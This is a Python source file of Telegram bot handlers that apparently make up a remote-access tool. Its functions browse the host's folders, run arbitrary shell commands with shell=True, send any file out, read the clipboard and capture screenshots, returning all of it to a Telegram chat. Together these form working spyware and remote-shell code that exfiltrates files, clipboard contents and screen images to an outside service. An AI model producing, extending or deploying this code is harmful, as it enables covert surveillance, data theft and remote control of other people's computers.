import os
from telegram import InputFile

async def explore_path(update, context, path):
    if not os.path.exists(path):
        await update.message.reply_text("❌ Path does not exist.")
        return

    if os.path.isdir(path):
        try:
            contents = os.listdir(path)
            output = f"📁 Contents of `{path}`:\n\n"
            for item in contents:
                full_path = os.path.join(path, item)
                output += f"{'📂' if os.path.isdir(full_path) else '📄'} {item}\n"
            if len(output) > 4000:
                with open("explorer.txt", "w", encoding="utf-8") as f:
                    f.write(output)
                await context.bot.send_document(chat_id=update.effective_chat.id, document=open("explorer.txt", "rb"))
                os.remove("explorer.txt")
            else:
                await update.message.reply_text(output)
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
    else:
        await update.message.reply_text("⚠️ That is a file, not a folder.")

async def send_clipboard(context, chat_id):
    import pyperclip
    try:
        content = pyperclip.paste()
        if content:
            await context.bot.send_message(chat_id=chat_id, text=f"📋 Clipboard: {content}")
        else:
            await context.bot.send_message(chat_id=chat_id, text="📋 Clipboard is empty.")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Error reading clipboard: {e}")

async def run_shell(update, context, command):
    import subprocess
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
        output = result.stdout or "✅ Done (no output)"
        if result.stderr:
            output += "\n⚠️ Errors:\n" + result.stderr
        await update.message.reply_text(f"💻 Output:\n{output}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def send_file(update, context, path):
    if os.path.exists(path) and os.path.isfile(path):
        try:
            with open(path, "rb") as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f)
        except Exception as e:
            await update.message.reply_text(f"❌ Error sending file: {e}")
    else:
        await update.message.reply_text("❌ File not found.")
async def send_screenshot(context, chat_id):
    import mss
    from PIL import Image

    try:
        filename = "screen.png"
        with mss.mss() as sct:
            sct.shot(output=filename)

        with open(filename, "rb") as f:
            await context.bot.send_photo(chat_id=chat_id, photo=f)

        os.remove(filename)
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Screenshot error: {e}")
